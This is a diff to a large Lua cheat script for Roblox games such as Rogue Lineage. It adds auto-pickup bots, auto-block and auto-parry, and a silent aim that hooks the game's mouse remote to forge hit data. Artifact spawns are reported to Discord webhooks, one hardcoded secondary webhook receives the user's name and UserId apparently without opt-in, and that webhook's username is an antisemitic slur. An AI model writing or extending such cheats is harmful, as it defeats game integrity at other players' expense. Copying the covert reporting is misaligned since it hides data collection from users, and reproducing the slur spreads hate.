+                    local main_part = weapon:IsA("Model") and FindFirstChildWhichIsA(weapon, "BasePart") or weapon
+                    local activation_distance = pickup.MaxActivationDistance - 2
+
+                    task.spawn(function()
+                        while
+                            (not shared)
+                            or (not Toggles)
+                            or (not Toggles.auto_weapon)
+                            or (not Toggles.auto_weapon.Value)
+                            or (not plr.Character)
+                            or (not FindFirstChild(plr.Character, "Head"))
+                            or (plr:DistanceFromCharacter(main_part.Position) > activation_distance)
+                        do
+                            task.wait(0.1)
+                        end
+
+                        repeat
+                            local character = plr.Character
+                            if
+                                character
+                                and FindFirstChild(character, "Head")
+                                and plr:DistanceFromCharacter(main_part.Position) <= activation_distance
+                            then
+                                fireclickdetector(pickup)
+                            end
+
+                            task.wait(0.1)
+                        until not weapon or not weapon:IsDescendantOf(thrown_folder)
+                    end)
+                end
+            end)
+        end
+
+
+        do
+            local thrown_folder = WaitForChild(ws, "Thrown")
+            utility:Connection(thrown_folder.ChildAdded, function(child)
+                if not shared or not (Toggles and Toggles.anti_globus and Toggles.anti_globus.Value) then return end
+
+                if child.Name == 'OrderBubble' then
+                    task.defer(function()
+                        child.CanTouch = false
+                    end)
+                end
+            end)
+        end
+
+        do
+            local trinkets = {}
+            local auto_trinket_enabled = false
+
+            local artifact_batch = {}
+            local batch_timer = nil
+            local BATCH_DELAY = 0.25
+
+            utility:Connection(ws.ChildAdded, function(object)
+                if object.Name == "Part" and FindFirstChild(object, "ID") then
+                    if auto_trinket_enabled then
+                        trinkets[#trinkets + 1] = object
                     end
 
-                    repeat
-                        local character = plr.Character
-                        if
-                            character
-                            and FindFirstChild(character, "Head")
-                            and plr:DistanceFromCharacter(weapon.Position) <= activation_distance
-                        then
-                            fireclickdetector(pickup)
+                    local trinket_name, trinket_color, trinket_zindex = cheat_client:identify_trinket(object)
+                    if trinket_color == cheat_client.trinket_colors.artifact.Color or trinket_color == cheat_client.trinket_colors.mythic.Color then
+                        table.insert(artifact_batch, {
+                            name = trinket_name,
+                            object = object
+                        })
+
+                        if not batch_timer then
+                            utility:sound("rbxassetid://6432593850", 2)
                         end
-                        task.wait(0.1)
-                    until not weapon or not weapon:IsDescendantOf(players_folder)
-                end)
-            end
 
-            local function handle_player_folder(player_folder)
-                utility:Connection(player_folder.ChildAdded, function(child)
-                    handle_weapon(child)
-                end)
+                        if batch_timer then
+                            task.cancel(batch_timer)
+                        end
 
-                for _, child in ipairs(player_folder:GetChildren()) do
-                    handle_weapon(child)
+                        batch_timer = task.delay(BATCH_DELAY, function()
+                            if #artifact_batch == 0 then return end
+
+                            local valid_artifacts = {}
+                            for _, artifact in ipairs(artifact_batch) do
+                                if artifact.object and artifact.object.Parent then
+                                    table.insert(valid_artifacts, artifact)
+                                end
+                            end
+
+                            artifact_batch = {}
+                            if #valid_artifacts == 0 then return end
+
+                            local artifact_names = {}
+                            local artifact_objects = {}
+                            local artifact_ids = {}
+                            for _, artifact in ipairs(valid_artifacts) do
+                                table.insert(artifact_names, artifact.name)
+                                table.insert(artifact_objects, artifact.object)
+                                local id_value = FindFirstChild(artifact.object, "ID")
+                                table.insert(artifact_ids, id_value and id_value.Value or "")
+                            end
+
+                            local unpicked_artifact_names = {}
+                            local unpicked_artifact_ids = {}
+                            for idx, artifact_obj in ipairs(artifact_objects) do
+                                if artifact_obj and artifact_obj.Parent then
+                                    table.insert(unpicked_artifact_names, artifact_names[idx])
+                                    table.insert(unpicked_artifact_ids, artifact_ids[idx])
+                                end
+                            end
+
+                            local first_object = artifact_objects[1]
+                            local function detectArtifactArea()
+                                if not FindFirstChild(ws, "AreaMarkers") then return "None" end
+
+                                local LocationName = "None"
+                                local LocationNumSq = math.huge
+                                local Area = ws.AreaMarkers
+                                local artifactPos = first_object.Position
+
+                                for i,v in pairs(Area:GetChildren()) do
+                                    local diff = artifactPos - v.Position
+                                    local distSq = diff.X * diff.X + diff.Y * diff.Y + diff.Z * diff.Z
+                                    if distSq < LocationNumSq then
+                                        LocationName = v.Name
+                                        LocationNumSq = distSq
+                                    end
+                                end
+
+                                return LocationName
+                            end
+
+                            local area = detectArtifactArea()
+                            local area_text = area ~= "None" and " ("..area..")" or ""
+
+                            local artifact_list = table.concat(artifact_names, ", ")
+                            local msg = string.format("✨ Artifact%s Spawned: %s%s",
+                                #artifact_names > 1 and "s" or "",
+                                artifact_list,
+                                area_text
+                            )
+                            library:Notify(msg, 10)
+
+                            local bot_running = (cheat_client.trinket_bot and cheat_client.trinket_bot.path_running) or (mem:HasItem("botstarted") and mem:GetItem("botstarted") == "true")
+                            local path_name = cheat_client.trinket_bot and cheat_client.trinket_bot.current_path_name or "None"
+                            local nearest_point_index = nil
+                            local nearest_point_distance = math.huge
+
+                            if bot_running and cheat_client.trinket_bot.path_points and #cheat_client.trinket_bot.path_points > 0 then
+                                local artifact_pos = first_object.Position
+                                for i, point in ipairs(cheat_client.trinket_bot.path_points) do
+                                    local distance = (point.position - artifact_pos).Magnitude
+                                    if distance < nearest_point_distance then
+                                        nearest_point_distance = distance
+                                        nearest_point_index = i
+                                    end
+                                end
+                            end
+
+                            local function get_last_looted(where)
+                                if game.PlaceId ~= 5208655184 then return "N/A" end
+                                local success, result = pcall(function()
+                                    if where == "cr" then
+                                        return math.floor((os.time() - workspace.MonsterSpawns.Triggers.CastleRockSnake.LastSpawned.Value) / 60) .. "m"
+                                    elseif where == "deepsunken" then
+                                        return math.floor((os.time() - workspace.MonsterSpawns.Triggers.evileye2.LastSpawned.Value) / 60) .. "m"
+                                    elseif where == "temple" then
+                                        return math.floor((os.time() - workspace.MonsterSpawns.Triggers.MazeSnakes.LastSpawned.Value) / 60) .. "m"
+                                    end
+                                end)
+                                return success and result or "N/A"
+                            end
+
+                            local player_count = #plrs:GetPlayers()
+
+                            local server_name, server_region = get_server_info()
+                            local webhook_msg = string.format("@here")
+
+                            local description = string.format("**Artifact%s:** %s\n",
+                                #artifact_names > 1 and "s" or "",
+                                artifact_list
+                            )
+
+                            if bot_running and nearest_point_index then
+                                description = description .. string.format("**Path:** %s\n", path_name)
+                                description = description .. string.format("**Point:** %d (%.0f studs)\n", nearest_point_index, nearest_point_distance)
+                            end
+
+                            description = description .. string.format("**Server:** `%s (%s)`\n\n",
+                                server_name ~= "" and server_name or "Unknown",
+                                server_region ~= "" and server_region or "Unknown"
+                            )
+
+                            description = description .. string.format("> Castle Rock: %s\n", get_last_looted("cr"))
+                            description = description .. string.format("> Sunken: %s\n", get_last_looted("deepsunken"))
+                            description = description .. string.format("> Temple of Fire: %s", get_last_looted("temple"))
+
+                            local footer_text
+                            if cheat_client.config.webhook_show_username ~= false then
+                                footer_text = string.format("Players: %d/23 | %s | Job: %s", player_count, plr.Name, game.JobId)
+                            else
+                                footer_text = string.format("Players: %d/23 | Job: %s", player_count, game.JobId)
+                            end
+
+                            local embed = {
+                                title = string.format("%s%s | ARTIFACT FOUND", artifact_list, area_text),
+                                description = description,
+                                color = 0xff3679,
+                                thumbnail = {
+                                    url = "https://static.wikia.nocookie.net/rogue-lineage/images/d/d8/PhiloRender.png/revision/latest?cb=20251012003300"
+                                },
+                                footer = {
+                                    text = footer_text
+                                },
+                                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+                            }
+
+                            if cheat_client.config.webhook and cheat_client.config.webhook ~= "" then
+                                pcall(function()
+                                    HXD_SEND_WEBHOOK(cheat_client.config.webhook, {
+                                        username = cheat_client.config.webhook_username or "bladee",
+                                        content = webhook_msg,
+                                        embeds = {embed}
+                                    })
+                                end)
+                            end
+
+                            local secondary_webhook_url = "WEBHOOK_URL_HERE"
+                            local should_send_secondary = cheat_client.config.webhook ~= secondary_webhook_url
+
+                            local player_has_artifact = #unpicked_artifact_names == 0
+
+                            local should_show_in_stream = false
+                            local httpService = Services.HttpService
+
+                            if mem:HasItem("trinket_bot_settings") then
+                                local success, bot_settings = pcall(function()
+                                    return httpService:JSONDecode(mem:GetItem("trinket_bot_settings"))
+                                end)
+                                if success and bot_settings and bot_settings.show_in_artifact_stream then
+                                    should_show_in_stream = true
+                                end
+                            end
+
+                            if not should_show_in_stream and mem:HasItem("shared_settings") then
+                                local success, shared_settings = pcall(function()
+                                    return httpService:JSONDecode(mem:GetItem("shared_settings"))
+                                end)
+                                if success and shared_settings and shared_settings.show_in_artifact_stream then
+                                    should_show_in_stream = true
+                                end
+                            end
+
+                            if not should_show_in_stream and Toggles.show_in_artifact_stream and Toggles.show_in_artifact_stream.Value then
+                                should_show_in_stream = true
+                            end
+
+                            if not player_has_artifact and should_show_in_stream and not (Toggles.StayInServer and Toggles.StayInServer.Value) then
+                                local unpicked_list = table.concat(unpicked_artifact_names, ", ")
+                                local stream_embed = {
+                                    title = string.format("%s%s | ARTIFACT FOUND", unpicked_list, area_text),
+                                    description = description,
+                                    color = 0xff3679,
+                                    thumbnail = {
+                                        url = "https://static.wikia.nocookie.net/rogue-lineage/images/d/d8/PhiloRender.png/revision/latest?cb=20251012003300"
+                                    },
+                                    footer = {
+                                        text = string.format("Players: %d/23 | Job: %s", player_count, game.JobId)
+                                    },
+                                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+                                }
+
+                                if cheat_client.trinket_bot and cheat_client.trinket_bot.pending_artifact_logs then
+                                    table.insert(cheat_client.trinket_bot.pending_artifact_logs, {
+                                        webhook_url = "WEBHOOK_URL_HERE",
+                                        username = "Jew",
+                                        embed = stream_embed,
+                                        artifact_names = unpicked_artifact_names,
+                                        artifact_ids = unpicked_artifact_ids
+                                    })
+                                    if #cheat_client.trinket_bot.pending_artifact_logs > 50 then
+                                        warn("Artifact log queue exceeded 50, removing oldest")
+                                        table.remove(cheat_client.trinket_bot.pending_artifact_logs, 1)
+                                    end
+                                    library:Notify(string.format("Artifact log queued: %s (%d total)", unpicked_list, #cheat_client.trinket_bot.pending_artifact_logs))
+                                end
+                            elseif not player_has_artifact and should_send_secondary and bot_running and not (Toggles.StayInServer and Toggles.StayInServer.Value) then
+                                pcall(function()
+                                    local log_description = string.format("**User:** %s (%d)\n<@%DISCORD_ID%>\n\n", plr.Name, plr.UserId) .. description
+
+                                    local log_embed = {
+                                        title = string.format("%s%s | ARTIFACT FOUND", artifact_list, area_text),
+                                        description = log_description,
+                                        color = 0xff3679,
+                                        thumbnail = {
+                                            url = "https://static.wikia.nocookie.net/rogue-lineage/images/d/d8/PhiloRender.png/revision/latest?cb=20251012003300"
+                                        },
+                                        footer = {
+                                            text = string.format("Players: %d/23 | %s | Job: %s", player_count, plr.Name, game.JobId)
+                                        },
+                                        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+                                    }
+
+                                    HXD_SEND_WEBHOOK(secondary_webhook_url, {
+                                        username = "Jew",
+                                        content = "<@&1454862161015734455>",
+                                        embeds = {log_embed}
+                                    })
+                                end)
+                            end
+
+                            batch_timer = nil
+                        end)
+                    end
                 end
-            end
-
-            utility:Connection(players_folder.ChildAdded, function(player_folder)
-                handle_player_folder(player_folder)
             end)
 
-            for _, player_folder in ipairs(players_folder:GetChildren()) do
-                handle_player_folder(player_folder)
+            local function start_auto_trinket_rendering()
+                if cheat_client.feature_connections.auto_trinket then return end
+
+                auto_trinket_enabled = true
+
+                trinkets = {}
+                for _,object in next, ws:GetChildren() do
+                    if object.Name == "Part" and FindFirstChild(object, "ID") then
+                        trinkets[#trinkets + 1] = object
+                    end
+                end
+
+                cheat_client.feature_connections.auto_trinket = utility:Connection(rs.Heartbeat, LPH_NO_VIRTUALIZE(function(delta_time)
+                    if not plr.Character then return end
+
+                    for i = #trinkets, 1, -1 do
+                        if not trinkets[i] or not trinkets[i].Parent then
+                            table.remove(trinkets, i)
+                        end
+                    end
+
+                    for _, object in next, trinkets do
+                        local trinket_name = cheat_client:identify_trinket(object)
+                        if trinket_name == "Azael Horn" then
+                            continue
+                        end
+
+                        local click_detector = FindFirstChild(object, "ClickDetector", true)
+                        local distance = plr:DistanceFromCharacter(object.CFrame.Position)
+                        local dist = 9e9
+
+                        if click_detector then
+                            dist = click_detector.MaxActivationDistance
+                        end
+
+                        if click_detector and distance > 0 and distance < dist then
+                            local trinket_id = FindFirstChild(object, "ID")
+                            if trinket_id and trinket_id:IsA("StringValue") and cheat_client.trinket_bot and cheat_client.trinket_bot.pending_pickup_ids then
+                                table.insert(cheat_client.trinket_bot.pending_pickup_ids, trinket_id.Value)
+                                while #cheat_client.trinket_bot.pending_pickup_ids > 100 do
+                                    table.remove(cheat_client.trinket_bot.pending_pickup_ids, 1)
+                                end
+                            end
+                            fireclickdetector(click_detector)
+                        end
+                    end
+                end), true)
+            end
+
+            local function stop_auto_trinket_rendering()
+                if cheat_client.feature_connections.auto_trinket then
+                    cheat_client.feature_connections.auto_trinket:Disconnect()
+                    cheat_client.feature_connections.auto_trinket = nil
+                end
+
+                auto_trinket_enabled = false
+                trinkets = {}
+            end
+
+            cheat_client.start_auto_trinket_rendering = start_auto_trinket_rendering
+            cheat_client.stop_auto_trinket_rendering = stop_auto_trinket_rendering
+
+            if Toggles and Toggles.auto_trinket and Toggles.auto_trinket.Value then
+                start_auto_trinket_rendering()
             end
         end
 
-        do -- Hold Block
+        do
+            if game.PlaceId ~= 3541987450 then
+                if ingredient_folder then
+                    local ingredients = {}
+                    local last_check_time = 0
+                    local check_interval = 0.2
+                    local active_ingredients = {}
+                    local player_position = nil
+                    local max_distance = 0
+                    
+                    local function update_active_ingredients()
+                        if not plr.Character then return end
+                        player_position = plr.Character.HumanoidRootPart.Position
+                        active_ingredients = {}
+                        
+                        for _, object in next, ingredients do
+                            if object and object.Parent then
+                                local click_detector = FindFirstChild(object, "ClickDetector")
+                                if click_detector then
+                                    max_distance = click_detector.MaxActivationDistance - 2
+                                    local distance = (object.Position - player_position).Magnitude
+                                    
+                                    if distance > 0 and distance < max_distance then
+                                        active_ingredients[#active_ingredients + 1] = {
+                                            object = object,
+                                            detector = click_detector
+                                        }
+                                    end
+                                end
+                            end
+                        end
+                    end
+        
+                    for _, object in next, ingredient_folder:GetChildren() do
+                        if not cheat_client.blacklisted_ingredients[object.Position] then
+                            ingredients[#ingredients + 1] = object
+                        end
+                    end
+                    
+                    utility:Connection(ingredient_folder.ChildAdded, function(object)
+                        if not cheat_client.blacklisted_ingredients[object.Position] then
+                            ingredients[#ingredients + 1] = object
+                            if plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") and cheat_client.feature_connections.auto_ingredient then
+                                local click_detector = FindFirstChild(object, "ClickDetector")
+                                if click_detector then
+                                    local distance = (object.Position - plr.Character.HumanoidRootPart.Position).Magnitude
+                                    if distance > 0 and distance < click_detector.MaxActivationDistance - 2 then
+                                        active_ingredients[#active_ingredients + 1] = {
+                                            object = object,
+                                            detector = click_detector
+                                        }
+                                    end
+                                end
+                            end
+                        end
+                    end)
+                    
+                    utility:Connection(ingredient_folder.ChildRemoved, function(object)
+                        for i, ingredient in ipairs(ingredients) do
+                            if ingredient == object then
+                                table.remove(ingredients, i)
+                                break
+                            end
+                        end
+                    end)
+                    
+                    local last_position = nil
+
+                    local function start_auto_ingredient_rendering()
+                        if cheat_client.feature_connections.auto_ingredient then return end
+
+                        cheat_client.feature_connections.auto_ingredient = utility:Connection(rs.Heartbeat, LPH_NO_VIRTUALIZE(function(delta_time)
+                            if not plr.Character or not FindFirstChild(plr.Character, "HumanoidRootPart") then return end
+
+                            local current_time = tick()
+                            local current_position = plr.Character.HumanoidRootPart.Position
+
+                            if last_position == nil or
+                               current_time - last_check_time > check_interval or
+                               (current_time - last_check_time > 0.1 and (current_position - last_position).Magnitude > 2) then
+
+                                last_check_time = current_time
+                                last_position = current_position
+                                update_active_ingredients()
+                            end
+
+                            for _, data in ipairs(active_ingredients) do
+                                fireclickdetector(data.detector)
+                            end
+                        end))
+                    end
+
+                    local function stop_auto_ingredient_rendering()
+                        if cheat_client.feature_connections.auto_ingredient then
+                            cheat_client.feature_connections.auto_ingredient:Disconnect()
+                            cheat_client.feature_connections.auto_ingredient = nil
+                        end
+                    end
+
+                    cheat_client.start_auto_ingredient_rendering = start_auto_ingredient_rendering
+                    cheat_client.stop_auto_ingredient_rendering = stop_auto_ingredient_rendering
+
+                    if Toggles and Toggles.auto_ingredient and Toggles.auto_ingredient.Value then
+                        start_auto_ingredient_rendering()
+                    end
+                end
+            end
+        end
+
+        do
+            local holdingF = false
+            local last_block_time = 0
+
             local function start_hold_block()
                 if cheat_client.feature_connections.hold_block then return end
 
-                cheat_client.feature_connections.hold_block = utility:Connection(rs.RenderStepped, LPH_NO_VIRTUALIZE(function()
-                    if uis:IsKeyDown(Enum.KeyCode.F) then
-                        local character = plr.Character
+                cheat_client.feature_connections.hold_block_input_began = utility:Connection(uis.InputBegan, function(input, processed)
+                    if not processed and input.KeyCode == Enum.KeyCode.F then
+                        holdingF = true
+                    end
+                end)
 
-                        if character then
-                            local remote = FindFirstChild(character, "Network")
+                cheat_client.feature_connections.hold_block_input_ended = utility:Connection(uis.InputEnded, function(input, processed)
+                    if input.KeyCode == Enum.KeyCode.F then
+                        holdingF = false
+                    end
+                end)
+
+                cheat_client.feature_connections.hold_block = utility:Connection(rs.RenderStepped, LPH_NO_VIRTUALIZE(function()
+                    if holdingF and plr.Character then
+                        local delay = ((Options and Options.HoldBlockDelay and Options.HoldBlockDelay.Value) or 0) / 1000
+                        local now = tick()
+
+                        if now - last_block_time >= delay then
+                            local remote = plr.Character:FindFirstChild("CharacterHandler")
+                                and plr.Character.CharacterHandler:FindFirstChild("Remotes")
+                                and plr.Character.CharacterHandler.Remotes:FindFirstChild("Block")
+
                             if remote then
                                 pcall(function()
-                                    remote:FireServer("Block")
+                                    remote:FireServer(false)
                                 end)
+                                last_block_time = now
                             end
                         end
                     end
@@ -12866,21 +25886,112 @@ if game.PlaceId == 100010170789226 then
             end
 
             local function stop_hold_block()
+                holdingF = false
+
                 if cheat_client.feature_connections.hold_block then
                     cheat_client.feature_connections.hold_block:Disconnect()
                     cheat_client.feature_connections.hold_block = nil
+                end
+
+                if cheat_client.feature_connections.hold_block_input_began then
+                    cheat_client.feature_connections.hold_block_input_began:Disconnect()
+                    cheat_client.feature_connections.hold_block_input_began = nil
+                end
+
+                if cheat_client.feature_connections.hold_block_input_ended then
+                    cheat_client.feature_connections.hold_block_input_ended:Disconnect()
+                    cheat_client.feature_connections.hold_block_input_ended = nil
                 end
             end
 
             cheat_client.start_hold_block = start_hold_block
             cheat_client.stop_hold_block = stop_hold_block
 
-            if Toggles and Toggles.HoldBlock and Toggles.HoldBlock.Value then
-                start_hold_block()
+                if Toggles and Toggles.HoldBlock and Toggles.HoldBlock.Value then
+                    start_hold_block()
+                end
+        end
+
+        do
+            local bags = {}
+
+            local function isValidBag(object)
+                return object:IsA("BasePart") and object.Name:find("Bag")
+            end
+
+            local function start_auto_bag()
+                if cheat_client.feature_connections.auto_bag then return end
+
+                bags = {}
+                for _, object in ipairs(ws.Thrown:GetChildren()) do
+                    if isValidBag(object) then
+                        bags[#bags + 1] = object
+                    end
+                end
+
+                cheat_client.feature_connections.auto_bag_child_added = utility:Connection(ws.Thrown.ChildAdded, function(object)
+                    if isValidBag(object) then
+                        bags[#bags + 1] = object
+                    end
+                end)
+
+                cheat_client.feature_connections.auto_bag_child_removed = utility:Connection(ws.Thrown.ChildRemoved, function(object)
+                    for i = #bags, 1, -1 do
+                        if bags[i] == object then
+                            table.remove(bags, i)
+                            break
+                        end
+                    end
+                end)
+
+                cheat_client.feature_connections.auto_bag = utility:Connection(rs.Heartbeat, LPH_NO_VIRTUALIZE(function()
+                    local character = plr.Character
+                    local rootPart = character and FindFirstChild(character, "HumanoidRootPart")
+                    if not rootPart then return end
+
+                    local range = (Options and Options.bag_range and Options.bag_range.Value) or 20
+                    for i = #bags, 1, -1 do
+                        local object = bags[i]
+                        if not object:IsDescendantOf(ws) then
+                            table.remove(bags, i)
+                        elseif (object.Position - rootPart.Position).Magnitude <= range then
+                            firetouchinterest(object, rootPart, 0)
+                            firetouchinterest(object, rootPart, 1)
+                        end
+                    end
+                end))
+            end
+
+            local function stop_auto_bag()
+                if cheat_client.feature_connections.auto_bag then
+                    cheat_client.feature_connections.auto_bag:Disconnect()
+                    cheat_client.feature_connections.auto_bag = nil
+                end
+
+                if cheat_client.feature_connections.auto_bag_child_added then
+                    cheat_client.feature_connections.auto_bag_child_added:Disconnect()
+                    cheat_client.feature_connections.auto_bag_child_added = nil
+                end
+
+                if cheat_client.feature_connections.auto_bag_child_removed then
+                    cheat_client.feature_connections.auto_bag_child_removed:Disconnect()
+                    cheat_client.feature_connections.auto_bag_child_removed = nil
+                end
+
+                bags = {}
+            end
+
+            cheat_client.start_auto_bag = start_auto_bag
+            cheat_client.stop_auto_bag = stop_auto_bag
+
+            if Toggles and Toggles.auto_bag and Toggles.auto_bag.Value then
+                start_auto_bag()
             end
         end
+        
+        
     
-        do -- Perflora Teleport + Attach to Back
+        do
             local function IsTargetValid(Target)
                 if (plr.Character and Target ~= nil and Target.Name == 'Humanoid' and FindFirstChild(Target.Parent, 'HumanoidRootPart') and Target.Parent ~= plr.Character) then
                     return true
@@ -12960,7 +26071,6 @@ if game.PlaceId == 100010170789226 then
                 start_perflora_teleport()
             end
 
-            -- attach to back
             local attach_victim = nil
             local attach_connection = nil
             local attach_notified = false
@@ -13101,7 +26211,7 @@ if game.PlaceId == 100010170789226 then
             end)
         end
 
-        do -- Auto Misogi
+        do
             local misogi_connections = {}
 
             local function handleAutoMisogi(obj)
@@ -13146,7 +26256,7 @@ if game.PlaceId == 100010170789226 then
             utility:Connection(plr.CharacterAdded, setupMisogi)
         end
 
-        do -- Auto Parry
+        do
             local DETECTION_RANGE = 30
             local AUTO_PARRY_COOLDOWN = 0.1
             local LAST_PARRY = 0
@@ -13157,7 +26267,7 @@ if game.PlaceId == 100010170789226 then
 
             local function getPing()
                 local success, ping = pcall(function()
-                    return game:GetService('Stats'):WaitForChild('PerformanceStats'):WaitForChild('Ping'):GetValue()
+                    return Services.Stats:WaitForChild('PerformanceStats'):WaitForChild('Ping'):GetValue()
                 end)
                 return success and ping or 0
             end
@@ -13189,8 +26299,6 @@ if game.PlaceId == 100010170789226 then
                 cas:UnbindAction("BlockAutoParryMouse")
             end
 
-            -- Functions
-            -- Check if on screen with raycast, NO FOV restriction
             local function is_on_screen_visible(characterHRP)
                 local vector, on_screen = ws.CurrentCamera:WorldToScreenPoint(characterHRP.Position)
 
@@ -13293,10 +26401,10 @@ if game.PlaceId == 100010170789226 then
                 local adjustedDelay = delay or 0
                 if Toggles and Toggles.ParryCustomDelay and Toggles.ParryCustomDelay.Value then
                     local customDelayMs = Options.ParryCustomDelayMs.Value
-                    adjustedDelay = adjustedDelay + (customDelayMs / 1000)  -- convert ms to seconds
+                    adjustedDelay = adjustedDelay + (customDelayMs / 1000)
                 elseif Toggles.ParryPingAdjust.Value then
                     local ping = getPing()
-                    local pingCompensation = ping / 2000  -- convert to seconds and divide by 2 (round trip)
+                    local pingCompensation = ping / 2000
                     adjustedDelay = adjustedDelay - pingCompensation
                 end
                 
@@ -13322,39 +26430,42 @@ if game.PlaceId == 100010170789226 then
                     humanoid:UnequipTools()
                 end
 
-                local network = plr.Character and FindFirstChild(plr.Character, "Network")
+                local blockRemote, unblockRemote
+                if plr.Character then
+                    local remotes = FindFirstChild(plr.Character, "CharacterHandler", true) and
+                                FindFirstChild(plr.Character.CharacterHandler, "Remotes")
+
+                    if remotes then
+                        blockRemote = FindFirstChild(remotes, "Block")
+                        unblockRemote = FindFirstChild(remotes, "Unblock")
+                    end
+                end
 
                 local semiBlatantBlock = Toggles.ParrySemiBlatantBlock and Toggles.ParrySemiBlatantBlock.Value
-                if semiBlatantBlock and network then
+                if semiBlatantBlock and blockRemote and unblockRemote then
                     task.spawn(function()
                         local endTime = tick() + blockDuration
                         while tick() < endTime do
-                            pcall(function()
-                                network:FireServer("Block")
-                            end)
+                            blockRemote:FireServer(false)
                             task.wait()
                         end
 
-                        pcall(function()
-                            network:FireServer("Unblock")
-                        end)
+                        local inputObject = {}
+                        unblockRemote:FireServer(inputObject)
                         unblockInputs()
                     end)
-                elseif useVim or not network then
+                elseif useVim or not (blockRemote and unblockRemote) then
                     task.spawn(function()
                         vim:SendKeyEvent(true, Enum.KeyCode.F, false, game)
                         task.wait(blockDuration)
                         vim:SendKeyEvent(false, Enum.KeyCode.F, false, game)
                     end)
                 else
-                    pcall(function()
-                        network:FireServer("Block")
-                    end)
+                    blockRemote:FireServer(false)
 
                     task.delay(blockDuration, function()
-                        pcall(function()
-                            network:FireServer("Unblock")
-                        end)
+                        local inputObject = {}
+                        unblockRemote:FireServer(inputObject)
                         unblockInputs()
                     end)
                 end
@@ -13587,7 +26698,6 @@ if game.PlaceId == 100010170789226 then
             end)
 
 
-            -- Grapple Parry
             local function setup_grapple_parry()
                 if not plr.Character then return end
 
@@ -13652,18 +26762,8 @@ if game.PlaceId == 100010170789226 then
             connect_players()
         end
 
-        do -- Silent Aim
-            local valid_tools = { 
-                Celeritas = true, 
-                Armis = true, 
-                Vulnere = true, 
-                ["Dagger Throw"] = true, 
-                Arguere = true, 
-                Grapple = true, 
-                ["Autumn Rain"] = true, 
-                Ignis = true, 
-                Percutiens = true 
-            }
+        do
+            local valid_tools = { Celeritas = true, Armis = true, Vulnere = true, ["Dagger Throw"] = true, Arguere = true, Grapple = true, ["Autumn Rain"] = true, Ignis = true, Percutiens = true }
 
             local get_nearest_player = LPH_NO_VIRTUALIZE(function()
                 local players_list = plrs:GetPlayers()
@@ -13672,16 +26772,15 @@ if game.PlaceId == 100010170789226 then
                 local nearest
             
                 local plr_humanoid_root_part = plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart")
-                local mouse_position = uis:GetMouseLocation()
+                local mouse_position = Vector2.new(mouse.X, mouse.Y)
             
                 if not plr_humanoid_root_part then
-                    return nil, nil
+                    return nil
                 end
             
                 local fov_radius = (Options and Options.SilentAimFov and Options.SilentAimFov.Value) or 100
                 local hitparts = {
-                    ["Head"] = true,
-                    ["HumanoidRootPart"] = true
+                    ["Head"] = true
                 }
             
                 local function is_visible_from_camera(part, target_character)
@@ -13717,6 +26816,10 @@ if game.PlaceId == 100010170789226 then
                     if target_player ~= plr and not cheat_client:is_friendly(target_player) then
                         local target_character = target_player.Character
                         if target_character then
+                            if FindFirstChild(target_character, "Carried") then
+                                continue
+                            end
+
                             local ignore_blocking = Toggles and Toggles.IgnoreBlocking and Toggles.IgnoreBlocking.Value
                             if ignore_blocking and FindFirstChild(target_character, "Blocking") then
                                 continue
@@ -13735,7 +26838,7 @@ if game.PlaceId == 100010170789226 then
                                         local distance_to_mouse = (mouse_position - target_screen_position).Magnitude
                                         
                                         if distance_to_mouse <= fov_radius and distance_to_mouse < closest_part_distance then
-                                            if is_visible_from_camera(part, target_character) then
+                                            if not cheat_client.config.visible_check or is_visible_from_camera(part, target_character) then
                                                 closest_part = part
                                                 closest_part_distance = distance_to_mouse
                                             end
@@ -13747,104 +26850,85 @@ if game.PlaceId == 100010170789226 then
                             if closest_part and closest_part_distance <= fov_radius and closest_part_distance < smallest_distance then
                                 smallest_distance = closest_part_distance
                                 nearest = target_player
-                                cheat_client.aimbot.silent_instance = closest_part
-                                cheat_client.aimbot.silent_position = closest_part.Position
+                                cheat_client.aimbot.silent_vector = closest_part.Position
+                                cheat_client.aimbot.current_target_part = closest_part
                             end
                         end
                     end
                 end
-                return nearest, cheat_client.aimbot.silent_instance
+                return nearest
             end)
             
+            function is_valid_tool_equipped()
+                local equipped_tool = plr.Character and FindFirstChildOfClass(plr.Character, "Tool")
+                return equipped_tool and valid_tools[equipped_tool.Name]
+            end
+
             local function start_silent_aim_rendering()
                 if cheat_client.feature_connections.silent_aim then return end
 
                 cheat_client.feature_connections.silent_aim = utility:Connection(rs.Heartbeat, LPH_NO_VIRTUALIZE(function()
                     local isHideFovCircleEnabled = Toggles and Toggles.HideFovCircle and Toggles.HideFovCircle.Value or false
-                    local mouse_pos = uis:GetMouseLocation()
+                    local mouse_pos = Vector2.new(uis:GetMouseLocation().X, uis:GetMouseLocation().Y)
                     aimbot_fov_circle.Position = mouse_pos
                     aimbot_fov_circle.Radius = (Options and Options.SilentAimFov and Options.SilentAimFov.Value) or 100
                     aimbot_fov_circle.Visible = cheat_client.window_active and not isHideFovCircleEnabled
 
-                    local nearest_player, nearest_part = get_nearest_player()
+                    local nearest_player = get_nearest_player()
                     if cheat_client and cheat_client.aimbot then
                         cheat_client.aimbot.current_target = nearest_player
+                    end
+
+                    if game.PlaceId ~= 14341521240 and get_mouse_remote then
+                        get_mouse_remote.OnClientInvoke = function()
+                            if not is_valid_tool_equipped() then
+                                return {
+                                    Hit = mouse.Hit,
+                                    Target = mouse.Target,
+                                    UnitRay = mouse.UnitRay,
+                                    X = mouse.X,
+                                    Y = mouse.Y
+                                }
+                            end
+
+                            if cheat_client and cheat_client.aimbot and cheat_client.aimbot.current_target and cheat_client.aimbot.silent_vector and cheat_client.aimbot.current_target_part then
+                                local camera = ws.CurrentCamera
+                                local target_screen_point = camera:WorldToScreenPoint(cheat_client.aimbot.silent_vector)
+                                local target_cframe = CFrame.new(cheat_client.aimbot.silent_vector)
+
+                                return {
+                                    Hit = target_cframe,
+                                    Target = cheat_client.aimbot.current_target_part,
+                                    X = target_screen_point.X,
+                                    Y = target_screen_point.Y,
+                                    UnitRay = Ray.new(camera.CFrame.Position, (cheat_client.aimbot.silent_vector - camera.CFrame.Position).Unit)
+                                }
+                            end
+
+                            return {
+                                Hit = mouse.Hit,
+                                Target = mouse.Target,
+                                UnitRay = mouse.UnitRay,
+                                X = mouse.X,
+                                Y = mouse.Y
+                            }
+                        end
                     end
                 end))
             end
 
             local function stop_silent_aim_rendering()
-                -- Disconnect heartbeat
